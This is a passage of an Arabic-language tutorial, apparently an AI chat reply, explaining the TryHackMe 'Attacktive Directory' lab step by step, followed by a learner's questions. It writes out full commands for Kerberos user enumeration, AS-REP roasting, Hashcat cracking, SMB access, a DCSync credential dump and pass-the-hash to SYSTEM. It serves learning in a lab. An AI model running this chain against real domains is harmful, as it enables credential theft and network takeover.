	فاكر طريقتنا كويس 👍
**شرح عميق – عملي – كل مصطلح يتشرح – كل أداة تتفهم – وربط كل حاجة ببعض** مش مجرد قراءة.

إنت دلوقتي وصلت لمرحلة مهمة جدًا في روم
TryHackMe
اسمها **Attacktive Directory**.

وآخر حاجة عملتها كانت:

1. استخدمت **Kerbrute** وجبت اليوزرز.
2. استخدمت سكربت **GetNPUsers.py** من
   Impacket
   وجبت **TGT Hash**.

دلوقتي هنفهم **إيه اللي حصل بالظبط تقنيًا** قبل ما نكمل الخطوات.
خلينا نمشي خطوة خطوة كأننا جوه الشبكة.

---

# 1️⃣ الأول: إيه اللي كنا بنعمله أصلًا؟

إحنا بنهاجم **Active Directory Environment**.

يعني فيه:

* **Domain (الدومين)** → `spookysec.local`
* **Domain Controller (السيرفر الرئيسي)** → `10.113.152.217`
* **Users** → زي `svc-admin`
* **Services** → SMB / RDP / LDAP / Kerberos

السيرفر ده هو:

**Domain Controller**

وده السيرفر اللي بيشغل:

* **Active Directory**
* **Kerberos Authentication**
* **LDAP**
* **DNS**

وكل دول بيخدموا على **البورتات** دي:

| Service  | Port |
| -------- | ---- |
| Kerberos | 88   |
| LDAP     | 389  |
| SMB      | 445  |
| DNS      | 53   |
| RDP      | 3389 |

إنت ركزت على **Kerberos (port 88)**.

---

# 2️⃣ ليه استخدمنا Kerbrute أصلاً؟

الأداة:

Kerbrute

دي أداة هدفها:

**Enumerate Valid Domain Users**

يعني:

> معرفة أي يوزر موجود فعلاً في الدومين.

---

## الفكرة التقنية

Kerberos بيشتغل كده:

لو طلبت Ticket ليوزر **مش موجود**

السيرفر يرد:

```
User does not exist
```

لو طلبت Ticket ليوزر **موجود**

السيرفر يرد بطريقة مختلفة.

الأداة تستغل الفرق ده.

---

## الأمر اللي استخدمته

```bash
kerbrute userenum -d HTM-AD users.txt --dc 10.113.152.217
```

خلينا نفككه:

### kerbrute

الأداة نفسها.

---

### userenum

معناها:

```
User Enumeration
```

يعني تجربة أسماء المستخدمين لمعرفة الموجود.

---

### -d HTM-AD

الدومين.

مهم جدًا لأن:

Kerberos لازم يعرف:

```
انت بتطلب ticket من انهي domain
```

لو كتبت دومين غلط:

❌ السيرفر هيرفض الطلب.

---

### users.txt

ده **Wordlist**

فيه أسماء يوزرز زي:

```
admin
administrator
svc-admin
backup
john
```

الأداة تجرب كل اسم.

---

### --dc

ده:

```
Domain Controller
```

يعني:

السيرفر اللي فيه **KDC**.

---

# 3️⃣ بعد ما جبنا اليوزرز عملنا إيه؟

لقيت يوزر مهم:

```
svc-admin
```

دلوقتي بدأنا الهجوم الحقيقي.

---

# 4️⃣ الهجوم: AS-REP Roasting

ده هجوم على:

**Kerberos**

وبيحصل لو الحساب عنده خاصية:  

```
Do not require Kerberos pre-authentication
```

---

## يعني إيه Pre-Authentication أصلاً؟

في Kerberos الطبيعي:

قبل ما السيرفر يديك **TGT**

لازم تثبت إنك صاحب الحساب.

فبتبعت:

```
timestamp encrypted with password hash
```

لو التشفير صح → السيرفر يديك Ticket.

---

لكن لو الحساب:

```
Pre-authentication disabled
```

السيرفر يعمل:

```
Send TGT without verifying password
```

وده ضعف أمني.

---

# 5️⃣ هنا دخلت أداة Impacket

المشروع:

Impacket

ده أشهر toolkit لاختراق Windows Network Protocols.

---

## السكربت اللي استخدمته

```
GetNPUsers.py
```

---

### NP

اختصار:

```
No Pre-authentication
```

---

### وظيفة السكربت

يسأل السيرفر:

```
هل فيه Users عندهم Pre-auth disabled؟
```

لو فيه:

السيرفر يرد ويقول:

```
خد Ticket
```

---

# 6️⃣ الأمر اللي شغلته

```bash
python3 GetNPUsers.py spookysec.local/ -usersfile users.txt -dc-ip 10.113.152.217
```

خلينا نفككه.

---

### python3

تشغيل السكربت بلغة بايثون.

---

### GetNPUsers.py

السكربت اللي بيطلب **AS-REP tickets**.
للبحث عنه:

find / -name GetNPUsers.py 2>/dev/null

---

### spookysec.local/

الدومين.

---

### -usersfile users.txt

قائمة اليوزرز اللي هنجرب عليهم.

---

### -dc-ip

IP بتاع السيرفر.

```
10.113.152.217
```

---

# 7️⃣ السيرفر رد عليك بإيه؟

السيرفر رد بحاجة بالشكل ده:

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:hashhashhash
```

ده:

**Kerberos AS-REP Hash**

---

## اسمه الكامل

```
Kerberos 5 AS-REP etype 23
```

وده اللي سألك عليه السؤال.

---

# 8️⃣ ليه السيرفر بعتلك Hash؟

لأن الحساب:

```
Pre-auth disabled
```

فالسيرفر بعتلك Ticket مشفرة.

لكن التشفير معمول باستخدام:

```
User Password
```

يعني لو كسرت الهاش → تعرف الباسورد.

---

# 9️⃣ هنا دخلت أداة Hashcat

الأداة:

Hashcat

دي أقوى أداة في العالم لكسر الهاشات.

---

## الأمر اللي المهندس كتبه

```
hashcat -O -m 18200 hased /usr/share/wordlists/rockyou.txt
```

خلينا نفهمه.

---

### hashcat

الأداة.

---

### -O

Optimization mode.

بيسرع الكسر.

---

### -m 18200

ده أهم جزء.

كل نوع Hash له رقم.

رقم:

```
18200
```

معناه:

```
Kerberos 5 AS-REP etype 23
```

---

### hased

الملف اللي فيه الهاش.

---

### rockyou.txt

أشهر Wordlist في Kali.

فيه:

```
14 مليون password
```

---

# 🔥 النتيجة

Hashcat يبدأ يجرب:

```
password1
123456
letmein
winter2024
admin123
```

لو كلمة السر موجودة في القائمة:

هيكسر الهاش ويطلع:

```
svc-admin : PASSWORD
```

---

# الخطوة اللي بعد كده في الروم

بعد ما نجيب الباسورد:

نستخدمه للدخول عبر:

1️⃣ SMB
2️⃣ RDP
3️⃣ WinRM

عشان ناخد **User Flag**.

---

# أهم حاجة عايزك تفهمها من اللي حصل

اللي حصل كله كان:

```
User Enumeration
↓
AS-REP Roasting
↓
Hash Cracking
↓
Credential Access
```

ودي مرحلة اسمها في الاختراق:

```
Initial Access
```

---

لو عندك ساعة تانية بكرة
قولي وأنا هشرحلك **المرحلة اللي بعدها في الروم** وهي:

* الدخول بـ **SMB**
* استخدام
  smbclient
* استخراج الملفات
* واستخدام
  BloodHound

وهنفهم **Active Directory Attack Path** بطريقة تخليك تفهم الرومات الجاية كلها.
تمام. هنكمل **من لحظة ما طلّعت الـ TGT Hash** لحد آخر الروم، خطوة-بخطوة **عمليًا**:

* ليه بنستخدم كل أداة
* الأمر بيتكوّن من إيه
* البدائل الممكنة
* وإيه اللي بيحصل تقنيًا جوه البروتوكول.

الأدوات اللي هتظهر في المرحلة دي هتكون من حزمة
Impacket
ومعها أدوات تانية زي
Hashcat و
smbclient.

---

# المرحلة 1 — استخراج الـ AS-REP Hash

إنت عملت:

```bash
python3 GetNPUsers.py spookysec.local/ -usersfile users.txt -dc-ip 10.113.152.217

python3 /opt/impacket-old/examples/GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.112.145.67 -no-pass | tee hash.txt
```

السيرفر رجعلك حاجة زي:

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:8a2b3c....
```

ده اسمه:

**Kerberos 5 AS-REP hash (etype 23)**

وده الهاش اللي هيتكسر.

---

# المرحلة 2 — تجهيز الهاش للكسر

أول حاجة لازم تعملها:

تحط الهاش في ملف.

مثلاً:

```bash
nano hash.txt
```

وتحط جواه:

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:8a2b3c....
```

احفظ.

ده الملف اللي Hashcat هيقرأه.

---

# المرحلة 3 — فهم Hashcat بعمق

الأداة:

Hashcat

دي أقوى أداة لكسر الهاشات.

فكرتها:

بدل ما نجرب الباسورد على السيرفر
نجربه على **الهاش نفسه Offline**.

---

## الأمر

```bash
hashcat -O -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

خلينا نفككه بالكامل.

---

## hashcat

تشغيل البرنامج.

---

## -m 18200

ده **hash mode**.

كل نوع hash له رقم.

18200 =

```
Kerberos 5 AS-REP etype 23
```

لو استخدمت رقم غلط:

Hashcat مش هيعرف يفسر الهاش.

---

## hash.txt

الملف اللي فيه الهاش.

---

## rockyou.txt

ملف فيه ملايين كلمات السر.

موجود في Kali هنا:

```
/usr/share/wordlists/rockyou.txt
```

عدد الكلمات فيه تقريبًا:

```
14 million passwords
```
# أين يوجد rockyou

في كالي:

/usr/share/wordlists/rockyou.txt

لمعرفة مكانه:

find / -name rockyou.txt 2>/dev/null
---

# إيه اللي بيحصل فعليًا أثناء الكسر؟

Hashcat يعمل الآتي:

1️⃣ ياخد كلمة من القائمة
2️⃣ يحولها لـ **Kerberos encryption key**
3️⃣ يجرب يفك التشفير
4️⃣ لو نجح → ده الباسورد

يعني:

```
hash → try password → generate key → decrypt
```

لو التشفير صح → تم الكسر.

---

# معنى -O

```
-O = Optimized kernel
```

يعني:

تشغيل نسخة أسرع من الخوارزمية.

لكن لها شرط:

كلمة السر ≤ 31 حرف.

---

# أوضاع أخرى في Hashcat

### بدون optimization

```
hashcat -m 18200 hash.txt rockyou.txt
```

أبطأ لكن يدعم كلمات أطول.

---

### attack mode

مثلاً:

```
-a 0
```

يعني **dictionary attack**

---

### مثال كامل

```
hashcat -m 18200 -a 0 hash.txt rockyou.txt
```

---

# أنواع attacks في Hashcat

## dictionary

تجربة كلمات جاهزة.

---

## brute force

```
hashcat -m 18200 -a 3 hash.txt ?a?a?a?a?a
```

يجرب كل الاحتمالات.

---

## mask attack

مثلاً:

```
?u?l?l?l?d?d
```

يعني:

```
Capital + 3 small + 2 numbers
```

---

# أداة بديلة لكسر الهاش

بديل مشهور:

John the Ripper

مثال:

```
john hash.txt --wordlist=rockyou.txt
```

لكن Hashcat أسرع.

---

# بعد الكسر

هيظهر:

```
svc-admin : management2005
```

ده credential.

---

# المرحلة 4 — الدخول للنظام

دلوقتي عندك:

```
username = svc-admin
password = management2005
```

نبدأ enumeration تاني.

---

# المرحلة 5 — البحث عن SMB shares

نستخدم: هنا احنا بنعمل تسجيل دخول علي الخدمه دي وبقدر استغل الي الخدمه بتعملو 


smbclient

---

## الأمر

```
smbclient -L //10.113.152.217 -U svc-admin
```

---

## شرح الأمر

### -L

list shares

---

### //IP

السيرفر.

---

### -U

username

---

هتدخل الباسورد.

---

هيطلع shares زي:

```
ADMIN$
C$
backup
IPC$
```

---

# المرحلة 6 — الدخول للـ share

مثلاً:

```
smbclient //10.113.152.217/backup -U svc-admin
```


لو وجدت مجلد مثلاً:

backup

تدخل إليه:

smbclient //IP/backup -U username

مثال:

smbclient //10.10.10.10/backup -U svc-admin

ستدخل شيء يشبه هذا:

smb: \>

هذا يسمى:

SMB shell
---

لو نجح:

هيفتح interactive shell.

---

# أوامر smbclient المهمة

### ls

عرض الملفات

---

### get

تحميل ملف

```
get file.txt
```

---

### mget

تحميل عدة ملفات.

---

### cd

تغيير المجلد.

---

هنا هتلاقي **flag user**.

---

# المرحلة 7 — اكتشاف حساب backup

في الروم هتلاقي user:

```
backup
```

وده حساب مهم.

---

# ليه حساب backup خطير؟

لأن عنده صلاحية:

```
Replication privileges
```

اسمها:

```
DS-Replication-Get-Changes
```

و

```
DS-Replication-Get-Changes-All
```

---

ده معناه:

يقدر يطلب **نسخة من قاعدة بيانات Active Directory**.

---

قاعدة البيانات اسمها:

```
NTDS.dit
```

وفيها:
# ما هو NTDS.dit ؟

الملف:

NTDS.dit

هو قاعدة بيانات خاصة بـ:

Active Directory

ويحتوي على:

جميع المستخدمين  
جميع كلمات المرور  
جميع الصلاحيات

لذلك هو **أهم ملف في الدومين**.

كل password hashes.

---

# المرحلة 8 — استخدام secretsdump

الأداة:

secretsdump.py
وظيفتها الأساسية:

استخراج كلمات المرور أو hashes من أنظمة Windows و Active Directory-
# خامساً: ماذا يفعل DCSync؟

الهجوم يجعل جهازك يتظاهر بأنه:

Domain Controller

ثم يقول للسيرفر:

أرسل لي بيانات المستخدمين للمزامنة

فيقوم السيرفر بإرسال:

password hashes

---

# سادساً: ماذا ستعطيك الأداة؟

بعد التشغيل سترى شيء مثل:

Administrator:500:aad3b435b51404eeaad3b435b51404ee  
krbtgt:502:hash  
svc-admin:1105:hash

## الأمر

```
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@IP
```

---

## شرح الأمر

### spookysec.local/

الدومين

---

### backup:password

credential

---

### @IP

السيرفر

---

# ماذا يفعل secretsdump؟

يعمل:

```
DCSync attack
```

يعني:

يتظاهر أنه Domain Controller
ويطلب نسخة من password database.

---

السيرفر يرد:

```
Administrator:500:hashhashhash
krbtgt:502:hashhashhash
user1:1000:hashhashhash
```

---

# أهم hash

```
Administrator
```

---

# المرحلة الأخيرة — الدخول كـ Administrator 
Pass the Hash

نستخدم:

```
psexec.py
```

أو

```
wmiexec.py
```

من

Impacket
وهذا يعني أنك حصلت على:

Administrator shell
---

## مثال

```
psexec.py administrator@10.113.152.217
```

أو

Pass the hash:

```
psexec.py administrator@10.113.152.217 -hashes :HASH
```

---

هيديك shell:

```
NT AUTHORITY\SYSTEM
```

---

# النتيجة

أنت الآن:

```
Domain Admin
```

---

# الهجمات اللي نفذتها في الروم

1️⃣ Kerberos User Enumeration
2️⃣ AS-REP Roasting
3️⃣ Hash Cracking
4️⃣ SMB Enumeration
5️⃣ Credential Access
6️⃣ DCSync Attack
7️⃣ Privilege Escalation

---

# لو عايز المستوى الأعلى (مهم جدًا)

ممكن أشرحلك بعد كده بعمق:

* ازاي **DCSync بيشتغل داخليًا**
* ازاي **NTDS.dit بيتكون**
* ازاي **BloodHound** بيلاقي attack paths
* وازاي الهاكرز يسيطروا على AD في الشركات.

وده فعليًا **نص شغل البينتيست في الشركات**.


اي نطق GETNPUsers 
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -format hashcat -dc-ip 10.113.152.217 -no-pass وهنا استخدمت الكود ده علي زياده عن الي انت بعتو زي لما استخدمت الي انت جبتو جبلي اني لازم ادخل الباسورد ولما كتبت نو باس الي اخر الكود دي مجبش التي جي تي برد و  لما كتبت فورمات  هاش كات جبها لي بقى 
هوا انا علي الدومين في الشبكه باليوزر والباسورد ازاي ولو زي ما انا فاهم دخلت عن طريق smbلي وازاي دخلت منها 
وهل اقدر اعمل كده من بورت تاني 
ازاي اعرف حاجه زي rockyou موجود في انهي ملف و GETNPUsers بردو 
وازاي شاف الملفات المبعوته باستخدام smb بستخدام اليوزر نيم والباسورد هل ده لاني عندي الصلحيه وهل لو دخلت علي برت تاني مسائول عن حاجه تاني اقدر اشوف الحاجه دي بردو لو عندي الصلحيه ومعيا اليوزر والباسورد 
يعني اي يفتح interactive shell ويعني اي shell وبعد ما شوفت الملفات الي مبعوته استخدمت اي وعملت اي في الخطوه الي بعد كده مش فاهم وعملت اي بملف بيكاب ولقيت في اي 
ولي حساب beckup مهم وخطير  
وقولتلك مفيش مصطلح او  كلمه انجليزي تتقال ومتتشرحش واي قاعدت البينات NTDS.dit  ومفهمتش اي الي حصل في خطوه 6 كويس  
ويعني اي credential 
 وقبل ما تستخدم secretsdump  الي فات مبني علي النطقته دي ولا عادي اعملها قبل ما ادخل بيكاب  
 اظون من الي قولتهولك كذه مره قبل كده تبقى فام طريقت الشرح الي تستخدمها معيا  واني محتاج افهم القصه قبل الشرح ورحنا فين واعملت اي ولي عملت كده 
 
